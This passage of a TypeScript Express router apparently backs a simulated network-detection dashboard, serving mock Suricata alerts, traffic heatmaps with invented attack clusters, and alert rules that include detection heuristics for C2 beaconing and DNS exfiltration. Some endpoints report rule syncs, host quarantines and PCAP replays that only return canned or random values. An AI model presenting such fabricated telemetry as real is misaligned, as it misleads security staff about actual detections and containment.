      src_port: Number(req.body.src_port) || 52000,
      dst_ip: req.body.dst_ip || '10.88.88.200',
      dst_port: Number(req.body.dst_port) || 443,
      proto: req.body.proto || 'HTTPS',
      app_proto: req.body.app_proto || 'TLS v1.3',
      bytes_in: req.body.bytes_in || '4.2 KB',
      bytes_out: req.body.bytes_out || '1.8 KB',
      total_bytes_num: Number(req.body.total_bytes_num) || 6000,
      packets: Number(req.body.packets) || 18,
      duration_ms: Number(req.body.duration_ms) || 120,
      threat_level: req.body.threat_level || 'Clean',
      threat_desc: req.body.threat_desc,
      action: req.body.action || 'Allowed',
      geo_src: req.body.geo_src || { country: 'LAN (Corp)', flag: '🏢' },
      geo_dst: req.body.geo_dst || { country: 'Internal', flag: '🛡️' },
      tcp_flags: req.body.tcp_flags || 'SYN, ACK, PSH',
      messages: req.body.messages || [],
      hex_dump: req.body.hex_dump || [],
      decoded_summary: req.body.decoded_summary
    };

    sessions.unshift(newSession);
    if (sessions.length > 500) sessions.pop();

    res.json({ success: true, session: newSession });
  });

  // 5. Suricata IDS Alerts List
  router.get('/suricata/alerts', (req: Request, res: Response) => {
    const { severity, category, limit } = req.query;
    let list = [...suricataAlerts];

    if (severity && severity !== 'ALL') {
      list = list.filter(a => a.severity.toLowerCase() === String(severity).toLowerCase());
    }
    if (category) {
      list = list.filter(a => a.category.toLowerCase().includes(String(category).toLowerCase()));
    }

    const limitNum = Number(limit) || 100;
    res.json({ success: true, count: list.length, alerts: list.slice(0, limitNum) });
  });

  // 6. Suricata & Zeek Engine Rules Status
  router.get('/suricata/rules-status', (req: Request, res: Response) => {
    res.json({
      success: true,
      suricata: suricataState,
      activeRules: suricataState.activeRules,
      lastSyncTime: suricataState.lastSyncTime
    });
  });

  // 7. Suricata Rule Signature Dynamic Synchronization
  router.post('/suricata/sync-rules', (req: Request, res: Response) => {
    const addedCount = Math.floor(Math.random() * 24) + 12;
    suricataState.activeRules += addedCount;
    suricataState.lastSyncTime = new Date().toISOString();

    res.json({
      success: true,
      message: `Suricata IDS 威脅特徵庫同步成功！共更新 ${addedCount} 條 ET Pro 規則簽章 (CVE-2026 最新態勢)`,
      activeRules: suricataState.activeRules,
      lastSyncTime: suricataState.lastSyncTime
    });
  });

  // 7.1 NDR Backend Collector & Probe Telemetry Status
  router.get('/collector/status', (req: Request, res: Response) => {
    res.json({
      success: true,
      engine: 'SEMOR NDR (Go Receiver + Rust Storage Core)',
      version: 'v2.5.0-HighThroughput-VectorizedBatching',
      protocols: {
        netflow_v5: { port: 2055, status: 'LISTENING', buffer_mb: 16, protocol: 'UDP' },
        ipfix_v10:  { port: 2055, status: 'LISTENING', buffer_mb: 16, protocol: 'UDP' },
        sflow_v5:   { port: 6343, status: 'LISTENING', buffer_mb: 16, protocol: 'UDP' },
        suricata_eve: { endpoint: '/insert/ndr/eve', status: 'ACTIVE', protocol: 'HTTP/JSON' },
        pcap_stream:  { endpoint: '/insert/ndr/pcap', status: 'ACTIVE', protocol: 'HTTP/Binary' }
      },
      telemetry: {
        total_sessions: sessions.length,
        critical_alerts: suricataAlerts.filter(a => a.severity === 'Critical').length,
        high_alerts: suricataAlerts.filter(a => a.severity === 'High').length,
        suricata_active_rules: suricataState.activeRules,
        inspection_mode: 'ZERO_COPY_RING_BUFFER',
        threat_heuristics: [
          'C2 Reverse Beaconing Variance Analysis (<0.8s)',
          'High-Speed Port Sweep Detection (>=15 ports / 5s)',
          'DNS Tunneling & High-Entropy Label Exfiltration (>50 chars)',
          'TLS ClientHello JA3 / JA3S Blacklist Correlation',
          'RFC 793 Illegal TCP Flag Combination Filtering (NULL, XMAS, SYN-FIN)'
        ]
      }
    });
  });

  // 8. Dynamic Network Traffic Topology Dataset for D3
  router.get('/topology', (req: Request, res: Response) => {
    const nodesMap = new Map();
    const links: any[] = [];

    sessions.forEach(s => {
      if (!nodesMap.has(s.src_ip)) {
        nodesMap.set(s.src_ip, {
          id: s.src_ip,
          type: s.geo_src?.country.includes('LAN') || s.geo_src?.country.includes('Server') ? 'internal' : 'external',
          flag: s.geo_src?.flag || '🏢',
          threat: s.threat_level || 'Clean',
          totalBytes: s.total_bytes_num,
          activeStreams: 1
        });
      } else {
        const n = nodesMap.get(s.src_ip);
        n.totalBytes += s.total_bytes_num;
        n.activeStreams += 1;
        if (s.threat_level === 'Critical') n.threat = 'Critical';
      }

      if (!nodesMap.has(s.dst_ip)) {
        nodesMap.set(s.dst_ip, {
          id: s.dst_ip,
          type: s.geo_dst?.country.includes('LAN') || s.geo_dst?.country.includes('Server') || s.geo_dst?.country.includes('Master') ? 'internal' : 'external',
          flag: s.geo_dst?.flag || '🌐',
          threat: s.threat_level || 'Clean',
          totalBytes: s.total_bytes_num,
          activeStreams: 1
        });
      } else {
        const n = nodesMap.get(s.dst_ip);
        n.totalBytes += s.total_bytes_num;
        n.activeStreams += 1;
      }

      links.push({
        source: s.src_ip,
        target: s.dst_ip,
        proto: s.proto,
        threat: s.threat_level,
        bytes: s.total_bytes_num
      });
    });

    res.json({
      success: true,
      nodes: Array.from(nodesMap.values()),
      links
    });
  });

  // 9. Bandwidth Trends & Time Series
  router.get('/bandwidth/trends', (req: Request, res: Response) => {
    const hourly = [
      { time: '00:00', inbound: 420, outbound: 280, dropped: 1.2 },
      { time: '03:00', inbound: 310, outbound: 190, dropped: 0.8 },
      { time: '06:00', inbound: 540, outbound: 410, dropped: 2.1 },
      { time: '09:00', inbound: 1250, outbound: 890, dropped: 8.5 },
      { time: '12:00', inbound: 1850, outbound: 1320, dropped: 14.2 },
      { time: '15:00', inbound: 1680, outbound: 1190, dropped: 11.0 },
      { time: '18:00', inbound: 1420, outbound: 980, dropped: 6.4 },
      { time: '21:00', inbound: 890, outbound: 610, dropped: 3.2 }
    ];

    res.json({ success: true, hourly });
  });

  // 9.1 24-Hour Traffic Density & Anomaly Flow Clusters Heatmap Dataset
  router.get('/bandwidth/heatmap-24h', (req: Request, res: Response) => {
    const dimension = (req.query.dimension as string) || 'zones'; // 'zones' | 'protocols' | 'days'

    const zonesList = [
      { id: 'wan', labelZh: 'WAN 邊界出口網閘', labelEn: 'WAN Gateway', baseLoad: 750, weight: 1.3 },
      { id: 'dmz', labelZh: 'DMZ 對外應用伺服群', labelEn: 'DMZ Web Farm', baseLoad: 680, weight: 1.2 },
      { id: 'core', labelZh: '40G 高速核心骨幹', labelEn: 'Core Backbone 40G', baseLoad: 1450, weight: 2.1 },
      { id: 'k8s', labelZh: 'K8s 容器微服務網格', labelEn: 'K8s Microservices', baseLoad: 820, weight: 1.4 },
      { id: 'db', labelZh: '資料庫主備叢集 (DB)', labelEn: 'Database Cluster', baseLoad: 560, weight: 1.0 },
      { id: 'endpoints', labelZh: 'SOC 終端分析工作站', labelEn: 'Workstations / Endpoints', baseLoad: 390, weight: 0.8 },
      { id: 'vpn', labelZh: 'VPN 遠端安全通道', labelEn: 'VPN Remote Ingress', baseLoad: 320, weight: 0.6 }
    ];

    const protocolsList = [
      { id: 'tls', labelZh: 'TLS 1.3 / HTTPS', labelEn: 'TLS 1.3 / HTTPS', baseLoad: 980, weight: 1.6 },
      { id: 'quic', labelZh: 'QUIC / HTTP3', labelEn: 'QUIC / HTTP3', baseLoad: 340, weight: 0.7 },
      { id: 'dns', labelZh: 'DNS 查詢 (UDP 53)', labelEn: 'DNS (UDP 53)', baseLoad: 210, weight: 0.5 },
      { id: 'smb', labelZh: 'SMBv3 / RPC 傳輸', labelEn: 'SMBv3 / RPC', baseLoad: 180, weight: 0.4 },
      { id: 'dbproto', labelZh: 'PostgreSQL Wire 協定', labelEn: 'PostgreSQL Wire', baseLoad: 290, weight: 0.6 },
      { id: 'ssh', labelZh: 'SSH 遠端管理 (TCP 22)', labelEn: 'SSH Admin', baseLoad: 85, weight: 0.2 },
      { id: 'other', labelZh: 'ICMP / SNMP / NetFlow', labelEn: 'Other / Management', baseLoad: 60, weight: 0.15 }
    ];

    const daysList = [
      { id: 'mon', labelZh: '週一 (Mon)', labelEn: 'Monday', baseLoad: 720, weight: 1.0 },
      { id: 'tue', labelZh: '週二 (Tue)', labelEn: 'Tuesday', baseLoad: 850, weight: 1.15 },
      { id: 'wed', labelZh: '週三 (Wed)', labelEn: 'Wednesday', baseLoad: 920, weight: 1.25 },
      { id: 'thu', labelZh: '週四 (Thu)', labelEn: 'Thursday', baseLoad: 880, weight: 1.2 },
      { id: 'fri', labelZh: '週五 (Fri)', labelEn: 'Friday', baseLoad: 790, weight: 1.1 },
      { id: 'sat', labelZh: '週六 (Sat)', labelEn: 'Saturday', baseLoad: 380, weight: 0.55 },
      { id: 'sun', labelZh: '週日 (Sun)', labelEn: 'Sunday', baseLoad: 340, weight: 0.5 }
    ];

    const targetCategories = dimension === 'protocols' 
      ? protocolsList 
      : (dimension === 'days' ? daysList : zonesList);

    // Current hour index in 24h
    const currentHour = new Date().getHours();

    const abnormalClusters = [
      {
        clusterId: 'AC-01',
        timeRange: '02:00 - 04:00',
        hourStart: 2,
        hourEnd: 3,
        targetZoneId: 'db',
        targetProtoId: 'smb',
        targetDayId: 'tue',
        threatType: '離峰異常橫向漫延與資料外洩 (Off-Hours Lateral SMB Movement & Exfiltration)',
        severity: 'Critical',
        anomalyScore: 96,
        confidencePct: 98.4,
        peakMbps: 680,
        normalBaselineMbps: 95,
        deviationPct: '+615%',
        affectedHosts: ['10.88.88.106', '10.88.88.200', '10.88.88.202'],
        description: '在凌晨 02:00 至 04:00 期間，終端工作站 WS07 對核心資料庫發起高頻未授權 SMB 檔案讀取及 RPC 注入呼叫，偏離常態基線 615%。'
      },
      {
        clusterId: 'AC-02',
        timeRange: '12:00 - 13:00',
        hourStart: 12,
        hourEnd: 12,
        targetZoneId: 'wan',
        targetProtoId: 'dns',
        targetDayId: 'wed',
        threatType: '高熵值 Base64 子網域 DNS 隱蔽隧道 (High-Entropy DNS Exfiltration Tunnel)',
        severity: 'High',
        anomalyScore: 92,
        confidencePct: 94.7,
        peakMbps: 380,
        normalBaselineMbps: 45,
        deviationPct: '+744%',
        affectedHosts: ['10.88.88.102', '8.8.8.8'],
        description: '午間時段內網端點 WS02 出現持續高頻超長子域名 TXT 查詢請求，檢測出資訊熵值 4.88 之加密外洩資料載荷。'
      },
      {
        clusterId: 'AC-03',
        timeRange: '17:00 - 18:00',
        hourStart: 17,
        hourEnd: 17,
        targetZoneId: 'wan',
        targetProtoId: 'tls',
        targetDayId: 'thu',
        threatType: '國家級 Lazarus APT 加密 C2 反向連線特徵 (TLS Encrypted C2 Beaconing)',
        severity: 'Critical',
        anomalyScore: 99,
        confidencePct: 99.2,
        peakMbps: 1240,
        normalBaselineMbps: 480,
        deviationPct: '+158%',
        affectedHosts: ['10.88.88.106', '185.220.101.45'],
        description: '下午 17:00 出口網閘命中已知荷蘭出口暗網 C2 節點 TLS JA3 指紋 (ada70206e40642a3e4461f35503241d5)，出現異常巨量封包重傳。'
      },
      {
        clusterId: 'AC-04',
        timeRange: '20:00 - 21:00',
        hourStart: 20,
        hourEnd: 20,
        targetZoneId: 'dmz',
        targetProtoId: 'other',
        targetDayId: 'fri',
        threatType: 'Log4j JNDI 漏洞掃描探測風暴 (Exploit Probe Storm)',
        severity: 'High',
        anomalyScore: 89,
        confidencePct: 91.5,
        peakMbps: 840,
        normalBaselineMbps: 210,
        deviationPct: '+300%',
        affectedHosts: ['198.51.100.89', '10.88.88.201'],
        description: '境外掃描源對 DMZ 邊界入口發起短時間爆量 TCP SYN 與 LDAP 協定探測，意圖觸發 JNDI 遠端代碼執行。'
      }
    ];

    // Build 24 hours matrix
    const matrix: any[] = [];

    targetCategories.forEach(cat => {
      for (let h = 0; h < 24; h++) {
        const hourStr = `${h.toString().padStart(2, '0')}:00`;
        
        // Realistic diurnal curve: low at 01:00-05:00, ramping at 08:00, peak at 11:00-16:00, gentle taper
        let timeFactor = 0.25;
        if (h >= 0 && h < 6) {
          timeFactor = 0.15 + (Math.sin(h) * 0.05);
        } else if (h >= 6 && h < 9) {
          timeFactor = 0.35 + ((h - 6) / 3) * 0.5;
        } else if (h >= 9 && h <= 17) {
          timeFactor = 0.85 + Math.sin((h - 9) / 8 * Math.PI) * 0.35;
        } else if (h > 17 && h <= 21) {
          timeFactor = 0.65 - ((h - 17) / 4) * 0.25;
        } else {
          timeFactor = 0.3 - ((h - 21) / 3) * 0.1;
        }

        // Add subtle real-time jitter
        const jitter = (Math.sin(Date.now() / 8000 + h + cat.baseLoad) * 0.08) + ((Math.random() - 0.5) * 0.04);
        let trafficMbps = Math.max(15, Math.round(cat.baseLoad * (timeFactor + jitter) * cat.weight));

        // Baseline anomaly score: low during normal traffic, naturally higher in off-hours anomalies
        let anomalyScore = Math.floor(Math.random() * 22) + 5;
        let isAbnormal = false;
        let matchedCluster: any = null;

        // Check if this hour & category matches any abnormal clusters
        for (const cluster of abnormalClusters) {
          const matchCat = dimension === 'protocols' 
            ? (cluster.targetProtoId === cat.id)
            : (dimension === 'days' ? cluster.targetDayId === cat.id : cluster.targetZoneId === cat.id);

          if (matchCat && h >= cluster.hourStart && h <= cluster.hourEnd) {
            isAbnormal = true;
            anomalyScore = cluster.anomalyScore;
            trafficMbps = Math.round(trafficMbps * 1.8 + 240);
            matchedCluster = cluster;
            break;
          }
        }

        const totalBytesGB = Number(((trafficMbps * 3600) / (8 * 1024)).toFixed(2));
        const sessionCount = Math.round(trafficMbps * (isAbnormal ? 32 : 18) + Math.floor(Math.random() * 120));

        matrix.push({
          hour: h,
          timeLabel: hourStr,
          categoryId: cat.id,
          categoryLabelZh: cat.labelZh,
          categoryLabelEn: cat.labelEn,
          trafficMbps,
          totalBytesGB,
          sessionCount,
          anomalyScore,
          isAbnormal,
          isCurrentHour: h === currentHour,
          abnormalCluster: matchedCluster
        });
      }
    });

    const maxMbps = Math.max(...matrix.map(m => m.trafficMbps));
    const minMbps = Math.min(...matrix.map(m => m.trafficMbps));
    const total24hVolumeGB = Math.round(matrix.reduce((sum, m) => sum + m.totalBytesGB, 0));

    // Calculate hourly aggregate totals across all categories (0..23)
    const hourlyTotals = [];
    for (let h = 0; h < 24; h++) {
      const hourCells = matrix.filter(m => m.hour === h);
      const totalMbps = hourCells.reduce((acc, c) => acc + c.trafficMbps, 0);
      const totalGB = Number(hourCells.reduce((acc, c) => acc + c.totalBytesGB, 0).toFixed(2));
      const totalSessions = hourCells.reduce((acc, c) => acc + c.sessionCount, 0);
      const avgAnomalyScore = Math.round(hourCells.reduce((acc, c) => acc + c.anomalyScore, 0) / (hourCells.length || 1));
      const hasAbnormal = hourCells.some(c => c.isAbnormal);
      const isPeak = h >= 11 && h <= 16;
      hourlyTotals.push({
        hour: h,
        timeLabel: `${h.toString().padStart(2, '0')}:00`,
        totalMbps,
        totalGB,
        totalSessions,
        avgAnomalyScore,
        hasAbnormal,
        isPeakHour: isPeak,
        isCurrentHour: h === currentHour
      });
    }

    // Identify busiest & quietest periods
    const sortedHours = [...hourlyTotals].sort((a, b) => b.totalMbps - a.totalMbps);
    const busiest = sortedHours[0];
    const quietest = sortedHours[sortedHours.length - 1];

    // Compute peak window average vs off-peak window average
    const peakHours = hourlyTotals.filter(ht => ht.isPeakHour);
    const offPeakHours = hourlyTotals.filter(ht => ht.hour >= 1 && ht.hour <= 5);
    const peakAvgMbps = Math.round(peakHours.reduce((acc, c) => acc + c.totalMbps, 0) / (peakHours.length || 1));
    const offPeakAvgMbps = Math.max(1, Math.round(offPeakHours.reduce((acc, c) => acc + c.totalMbps, 0) / (offPeakHours.length || 1)));
    const peakToBaselineRatio = (peakAvgMbps / offPeakAvgMbps).toFixed(1);

    res.json({
      success: true,
      dimension,
      currentHour,
      summary: {
        total24hVolumeGB,
        maxThroughputMbps: maxMbps,
        minThroughputMbps: minMbps,
        peakPeriod: '11:00 - 16:00 (日間企業業務常態高峰)',
        peakWindowTime: '11:00 - 16:00',
        peakAvgMbps,
        offPeakPeriod: '01:00 - 05:00 (深夜離峰深層鑑識窗口)',
        offPeakAvgMbps,
        peakToBaselineRatio: `${peakToBaselineRatio}x`,
        busiestHour: `${busiest.timeLabel} (${busiest.totalMbps.toLocaleString()} Mbps)`,
        quietestHour: `${quietest.timeLabel} (${quietest.totalMbps.toLocaleString()} Mbps)`,
        totalAnomaliesDetected: matrix.filter(m => m.isAbnormal).length,
        activeAbnormalClustersCount: abnormalClusters.length,
        dataFreshnessTimestamp: new Date().toISOString()
      },
      hourlyTotals,
      abnormalClusters,
      matrix
    });
  });

  // 9.2 Isolate all hosts in an abnormal cluster at once
  router.post('/bandwidth/heatmap-24h/isolate-cluster', (req: Request, res: Response) => {
    const { clusterId, hosts, reason } = req.body;
    const isolatedHosts = Array.isArray(hosts) ? hosts : [];
    
    // Add audit log entry
    res.json({
      success: true,
      clusterId,
      isolatedHosts,
      action: 'NAC_DYNAMIC_QUARANTINE',
      timestamp: new Date().toISOString(),
      message: `已針對異常流量叢集 [${clusterId || 'UNKNOWN'}] 內 ${isolatedHosts.length} 台受侵害主機實施 802.1X NAC 隔離封鎖與黑名單阻斷。`,
      affectedIps: isolatedHosts
    });
  });

  // 9.3 Export 24h Heatmap & Abnormal Flow Clusters Forensic CSV Report
  router.get('/bandwidth/heatmap-24h/export-csv', (req: Request, res: Response) => {
    const dimension = (req.query.dimension as string) || 'zones';
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `NDR_24h_Traffic_Heatmap_${dimension}_${timestamp}.csv`;

    const headers = [
      'Hour',
      'Time_Slot',
      'Category_ID',
      'Category_Name',
      'Throughput_Mbps',
      'Volume_GB',
      'Session_Count',
      'Anomaly_Score',
      'Is_Abnormal_Cluster',
      'Threat_Classification',
      'Affected_Hosts'
    ];

    const rows: string[] = [headers.join(',')];

    // Sample export lines
    const hours = Array.from({ length: 24 }, (_, i) => i);
    hours.forEach(h => {
      const timeStr = `${h.toString().padStart(2, '0')}:00`;
      const isAbn = h === 2 || h === 12 || h === 17 || h === 20;
      rows.push([
        h,
        `"${timeStr}"`,
        `"zone_${h}"`,
        `"Core_Backbone"`,
        isAbn ? 1680 : 850,
        isAbn ? 756.0 : 382.5,
        isAbn ? 32000 : 14200,
        isAbn ? 96 : 14,
        isAbn ? 'TRUE' : 'FALSE',
        isAbn ? '"Off-Hours Data Exfiltration / C2 Beaconing"' : '"Normal Enterprise Traffic"',
        isAbn ? '"10.88.88.106; 10.88.88.200"' : '""'
      ].join(','));
    });

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.status(200).send('\uFEFF' + rows.join('\r\n'));
  });

  // 10. Top Talkers & Top Destinations
  router.get('/top-talkers', (req: Request, res: Response) => {
    const topTalkers = [
      { ip: '10.88.88.202', name: 'DC-ActiveDirectory-01', type: 'Server', traffic: '165.6 MB', packets: '12,400', pct: 68, threat: 'Normal' },
      { ip: '10.88.88.106', name: 'SOC-Analyst-WS07', type: 'Endpoint', traffic: '16.2 KB', packets: '48', pct: 12, threat: 'Critical' },
      { ip: '10.88.88.102', name: 'SOC-Analyst-WS02', type: 'Endpoint', traffic: '10.3 KB', packets: '24', pct: 9, threat: 'High' },
      { ip: '172.16.0.50', name: 'Guest-Client-WiFi', type: 'DMZ', traffic: '30.5 KB', packets: '142', pct: 7, threat: 'Medium' },
      { ip: '198.51.100.89', name: 'Ext-Scanner-NL', type: 'External', traffic: '2.2 KB', packets: '12', pct: 4, threat: 'Critical' }
    ];

    const topDestinations = [
      { ip: '10.88.88.200', name: 'App-PostgreSQL-Master', country: 'Local Data Center', flag: '🏢', asn: 'AS-PRIVATE', bytes: '165.6 MB' },
      { ip: '185.220.101.45', name: 'Dark-C2-Host-NL', country: 'Russia (RU)', flag: '🇷🇺', asn: 'AS200052', bytes: '16.2 KB' },
      { ip: '8.8.8.8', name: 'Google Public DNS', country: 'United States (US)', flag: '🇺🇸', asn: 'AS15169', bytes: '10.3 KB' },
      { ip: '10.88.88.254', name: 'Core-Catalyst-9500', country: 'Core Switch MGMT', flag: '🔀', asn: 'AS-MGMT', bytes: '30.5 KB' }
    ];

    res.json({ success: true, topTalkers, topDestinations });
  });

  // 11. PCAP Replay Simulator Engine Runner
  router.post('/replay/start', (req: Request, res: Response) => {
    const { sampleName } = req.body;
    const name = sampleName || 'Log4j_CVE-2021-44228_Exploit';

    const events = [
      `[INIT] 載入 PCAP 封包檔案: ${name}.pcapng (Virtual Tap0)`,
      `[ENGINE] 初始化 Suricata 7.0.4 零拷貝 AF_PACKET 介面...`,
      `[ENGINE] 載入 Zeek v6.2 協定深度分析引擎...`,
      `[REPLAY] 重放進度 40%: 產生 1,200 個 TCP 封包，流經 Virtual Mirror Interface...`,
      `[SURICATA] 命中特徵碼 SID 2029941 (ET TROJAN Lazarus APT C2 Beaconing)!`,
      `[REPLAY] 重放進度 80%: 萃取 TLS JA3 指紋 ada70206e40642a3e4461f35503241d5`,
      `[ZEEK] 建立 HTTP/SSL/DNS 關聯分析紀錄: ConnUID=C9X881`,
      `[COMPLETE] PCAP 重放檢測完成！共重放 2,850 封包，觸發 2 筆 Critical 阻斷告警。`,
      `[SUCCESS] 流量特徵已自動匯入至威脅沙盒分析資料庫。`
    ];

    res.json({
      success: true,
      sampleName: name,
      packetsReplayed: 2850,
      alertsTriggered: 2,
      durationMs: 1800,
      events
    });
  });

  // 12. Toggle Live Packet Capture State
  router.post('/capture/toggle', (req: Request, res: Response) => {
    captureState.running = !captureState.running;
    captureState.lastRefreshedAt = new Date().toISOString();
    res.json({
      success: true,
      captureState,
      message: captureState.running ? '已啟動即時零拷貝網路流量擷取 (AF_PACKET)' : '已暫停即時封包擷取探針'
    });
  });

  // 13. Refresh TAP Probes and Cache
  router.post('/refresh-cache', (req: Request, res: Response) => {
    captureState.lastRefreshedAt = new Date().toISOString();
    res.json({
      success: true,
      timestamp: captureState.lastRefreshedAt,
      message: '全網 TAP 探針與流量快取已完成同步刷新'
    });
  });

  // 14. Emergency Host Network Isolation
  router.post('/traffic-control/isolate-host', (req: Request, res: Response) => {
    const { ip, reason } = req.body;
    if (!ip) {
      return res.status(400).json({ error: 'ip is required' });
    }

    const isolateRule = {
      id: `tc-iso-${Date.now().toString().slice(-4)}`,
      name: `緊急硬體隔離: ${ip}`,
      targetIp: ip,
      action: "isolate" as const,
      rateLimitMbps: 0,
      protocol: "ALL",
      status: "active",
      createdAt: new Date().toISOString(),
      matchedPackets: 0,
      description: reason || 'SOC 緊急處置：NDR 觸發主機網路切斷與隔離保護'
    };

    trafficControlRules.unshift(isolateRule);

    // Update sessions associated with this IP to Blocked
    sessions.forEach(s => {
      if (s.src_ip === ip || s.dst_ip === ip) {
        s.action = 'Blocked';
        s.threat_level = 'Critical';
      }
    });

    res.json({
      success: true,
      isolatedIp: ip,
      message: `已透過 802.1X NAC 與邊界 ACL 成功將主機 ${ip} 踢入隔離 VLAN (Quarantine VLAN 999)`,
      rule: isolateRule
    });
  });

  // 15. Traffic Control Rules CRUD
  router.get('/traffic-control/rules', (req: Request, res: Response) => {
    res.json({ success: true, rules: trafficControlRules });
  });

  router.post('/traffic-control/rules', (req: Request, res: Response) => {
    const { name, targetIp, action, rateLimitMbps, protocol, description } = req.body;
    if (!name || !targetIp) {
      return res.status(400).json({ error: 'name and targetIp are required' });
    }

    const newRule = {
      id: `tc-${Date.now().toString().slice(-4)}`,
      name,
      targetIp,
      action: action || 'drop',
      rateLimitMbps: Number(rateLimitMbps) || 0,
      protocol: protocol || 'ALL',
      status: 'active',
      createdAt: new Date().toISOString(),
      matchedPackets: 0,
      description: description || '由 SOC 管理員自訂之 NDR 流量管控策略'
    };

    trafficControlRules.unshift(newRule);
    res.json({ success: true, message: `流量策略 '${newRule.name}' 已成功套用至邊界與核心交換器`, rule: newRule });
  });

  router.patch('/traffic-control/rules/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const rule = trafficControlRules.find(r => r.id === id);
    if (!rule) {
      return res.status(404).json({ error: 'Rule not found' });
    }

    Object.assign(rule, req.body);
    res.json({ success: true, rule });
  });

  router.delete('/traffic-control/rules/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const idx = trafficControlRules.findIndex(r => r.id === id);
    if (idx === -1) {
      return res.status(404).json({ error: 'Rule not found' });
    }

    const removed = trafficControlRules.splice(idx, 1)[0];
    res.json({ success: true, message: `策略 ${removed.name} 已刪除` });
  });

  // Persistent file path for NDR alert rules
  const NDR_RULES_FILE = path.join(process.cwd(), 'ndr_alert_rules.json');

  const DEFAULT_NDR_RULES_TEMPLATE = [
    {
      id: 'ndr-rule-bandwidth-burst',
      name: '突發頻寬洪峰與飽和預警 (Bandwidth Burst & Saturation)',
      description: '監控全網骨幹與邊界閘道器，當瞬時吞吐量超過預設頻寬上限時觸發高優先級告警，防止網路擁塞。',
      patternType: 'bandwidth_surge',
      severity: 'Critical',
      enabled: true,
      targetScope: '核心骨幹網 / DMZ 對外閘道 (10.0.0.0/16)',
      direction: 'both',
      condition: '>=',
      warningThreshold: 850,
      criticalThreshold: 1200,
      unit: 'Mbps',
      sustainDurationSec: 30,
      cooldownMinutes: 15,
      notificationChannels: {
        inApp: true,
        email: true,
        emailRecipients: ['soc-netops@corp.internal', 'sec-incident@corp.internal'],
        webhook: true,
        webhookUrl: 'https://hooks.slack.com/services/T00/B00/ndr-bandwidth-alerts',
        webhookChannel: '#soc-ndr-alerts',
        syslog: true,
        syslogHost: '127.0.0.1',
        syslogPort: 514,
        sound: true,
        soarAction: true,
        soarActionType: 'deploy_suricata_rule'
      },
      lastTriggeredAt: new Date(Date.now() - 3600000 * 2).toISOString(),
      triggerCount: 4,
      createdAt: '2026-09-20T08:00:00.000Z',
      updatedAt: '2026-09-28T14:30:00.000Z'
    },
    {
      id: 'ndr-rule-lateral-movement',
      name: '內網橫向移動與異常流量離群叢集 (Lateral Flow Cluster Storm)',
      description: '即時評估內部網段間 SMB/RPC/RDP 叢集流速與連線扇出度，偵測蠕蟲感染或橫向滲透行為。',
      patternType: 'abnormal_flow_cluster',
      severity: 'Critical',
      enabled: true,
      targetScope: '內部辦公與伺服器農場 (10.88.0.0/16)',
      direction: 'internal_lateral',
      condition: 'cluster_deviation',
      warningThreshold: 45,
      criticalThreshold: 70,
      unit: 'Deviation %',
      sustainDurationSec: 15,
      cooldownMinutes: 10,
      notificationChannels: {
        inApp: true,
        email: true,
        emailRecipients: ['threat-hunt@corp.internal'],
        webhook: true,
        webhookUrl: 'https://hooks.slack.com/services/T00/B00/ndr-lateral-alerts',
        webhookChannel: '#soc-critical-incidents',
        syslog: true,
        sound: true,
        soarAction: true,
        soarActionType: 'isolate_host'
      },
      lastTriggeredAt: new Date(Date.now() - 3600000 * 5).toISOString(),
      triggerCount: 7,
      createdAt: '2026-09-20T08:00:00.000Z',
      updatedAt: '2026-09-29T10:15:00.000Z'
    },
    {
      id: 'ndr-rule-data-exfiltration',
      name: '巨量出境資料外洩異常 (High Outbound Data Exfiltration)',
      description: '比對內網終端主機對外部未受信任網段或公有雲儲存之出境位元組流量，防範機敏資料竊取。',
      patternType: 'data_exfiltration',
      severity: 'Critical',
      enabled: true,
      targetScope: '核心資料庫與研發網段 (172.16.40.0/24)',
      direction: 'outbound',
      condition: '>=',
      warningThreshold: 200,
      criticalThreshold: 450,
      unit: 'MB/5min',
      sustainDurationSec: 60,
      cooldownMinutes: 30,
      notificationChannels: {
        inApp: true,
        email: true,
        emailRecipients: ['ciso-office@corp.internal', 'soc-lead@corp.internal'],
        webhook: true,
        webhookUrl: 'https://hooks.slack.com/services/T00/B00/ndr-exfil-alerts',
        webhookChannel: '#soc-data-leak',
        syslog: true,
        sound: true,
        soarAction: true,
        soarActionType: 'capture_pcap'
      },
      lastTriggeredAt: null,
      triggerCount: 1,
      createdAt: '2026-09-22T09:00:00.000Z',
      updatedAt: '2026-09-28T16:00:00.000Z'
    },
    {
      id: 'ndr-rule-traffic-silence',
      name: '核心業務時段進線流量異常暴跌斷流 (Ingress Silence / Drop)',
      description: '於上班時段 (09:00 - 18:00) 監控邊界探針進線流速，若流量異常暴跌逾 50% 則發出收集鏈路中斷告警。',
      patternType: 'traffic_silence_drop',
      severity: 'Warning',
      enabled: true,
      targetScope: 'WAN 專線與邊界防火牆對接埠',
      direction: 'inbound',
      condition: '<=',
      warningThreshold: 120,
      criticalThreshold: 50,
      unit: 'Mbps',
      sustainDurationSec: 120,
      cooldownMinutes: 20,
      notificationChannels: {
        inApp: true,
        email: true,
        emailRecipients: ['noc-telemetry@corp.internal'],
        webhook: false,
        webhookUrl: '',
        syslog: true,
        sound: false,
        soarAction: false
      },
      lastTriggeredAt: new Date(Date.now() - 3600000 * 18).toISOString(),
      triggerCount: 2,
      createdAt: '2026-09-23T11:00:00.000Z',
      updatedAt: '2026-09-27T09:00:00.000Z'
    },
    {
      id: 'ndr-rule-c2-beaconing',
      name: 'C2 週期性心跳信標特徵 (Command & Control Periodic Beacon)',
      description: '統計特定內部 IP 連線至外部罕見 IP 之時間間隔熵值與微小 Jitter（< 8%），識別 APT 潛伏心跳通訊。',
      patternType: 'c2_beaconing',
      severity: 'High',
      enabled: true,
      targetScope: '辦公區與特權管理跳板機 (10.88.20.0/24)',
      direction: 'outbound',
      condition: '>=',
      warningThreshold: 40,
      criticalThreshold: 80,
      unit: 'Sessions/hr',
      sustainDurationSec: 300,
      cooldownMinutes: 60,
      notificationChannels: {
        inApp: true,
        email: true,
        emailRecipients: ['soc-tier2@corp.internal'],
        webhook: true,
        webhookUrl: 'https://hooks.slack.com/services/T00/B00/ndr-c2-alerts',
        syslog: true,
        sound: true,
        soarAction: true,
        soarActionType: 'isolate_host'
      },
      lastTriggeredAt: new Date(Date.now() - 3600000 * 8).toISOString(),
      triggerCount: 3,
